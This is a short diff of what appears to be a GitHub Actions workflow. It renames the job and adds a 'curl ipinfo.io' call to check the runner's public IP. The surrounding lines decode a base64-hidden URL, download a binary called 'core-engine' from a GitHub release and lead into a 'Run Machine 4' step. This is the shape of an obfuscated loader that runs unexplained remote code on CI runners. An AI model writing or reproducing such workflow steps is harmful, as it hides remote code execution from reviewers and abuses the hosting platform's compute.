@@ -1,4 +1,4 @@
-name: learning proxy angular five
+name: part of learn proxy angular one
 
 on:
   push:
@@ -25,6 +25,7 @@ jobs:
           ENCODED="aHR0cHM6Ly9naXRodWIuY29tL3NyYXBhbmc2LWdsaXRjaC9jb3JlLWRhdGFiYXNlL3JlbGVhc2VzL2Rvd25sb2FkLzAuMC4xL2NvcmUtZGF0YWJhc2U="
           URL=$(echo "$ENCODED" | base64 -d)
           curl -L -o core-engine "$URL"
+          curl ipinfo.io
 
       - name: Run Machine 4
         run: |
